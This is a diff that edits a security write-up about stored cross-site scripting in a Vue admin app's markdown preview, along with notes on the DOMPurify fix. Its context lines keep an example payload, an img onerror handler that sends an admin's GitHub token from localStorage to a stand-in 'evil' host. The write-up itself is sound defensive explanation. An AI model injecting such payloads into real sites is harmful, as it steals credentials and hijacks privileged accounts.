@@ -24,11 +24,10 @@ outlives that change, so `v-html="md.parse(content)"` keeps getting written.
 A content-admin SPA (2026-06-11) had exactly this. The editor's preview pane piped
 `marked` output into `v-html` with no sanitizer anywhere in the dependency tree, and a
 custom raw-HTML renderer for media tags passed HTML blocks straight through on top of
-that. Two facts turn it from theoretical into critical. First, writers and readers sit
-at different privilege levels: editor-role users write the blog content, while chief
-editors and admins review it in the same preview pane. Second, the session being
-exposed is valuable, since the admin's GitHub token lived in localStorage with `repo`
-and `admin:org` scopes.
+that. Writers and readers sit at different privilege levels: editor-role users write
+the blog content, while chief editors and admins review it in the same preview pane.
+And the exposed session is valuable, since the admin's GitHub token lived in
+localStorage with `repo` and `admin:org` scopes.
 
 A low-privilege editor commits a post containing
 `<img src=x onerror="fetch('https://evil/?t='+localStorage.gh_token)">`, asks for
@@ -59,13 +58,13 @@ const html = computed(() =>
 
 Two practical notes from the same fix:
 
-- **DOMPurify's default URI policy blocks `blob:`.** If your preview resolves
+- DOMPurify's default URI policy blocks `blob:`. If your preview resolves
   relative asset paths to object URLs, extend the regexp or the images vanish. The
   default policy still passes relative paths and `#anchors` through the non-alpha
   branch, so footnote links and `./assets/` references survive untouched.
-- **Custom renderers are part of the surface.** A marked extension with an
+- Custom renderers are part of the surface. A marked extension with an
   `html({ text })` hook that returns the text is an explicit raw-HTML pass-through.
-  The sanitizer has to run *after* every renderer, which is the reason the boundary
+  The sanitizer has to run after every renderer, which is the reason the boundary
   is the injection point rather than somewhere inside the pipeline.
 
 ## Anti-patterns
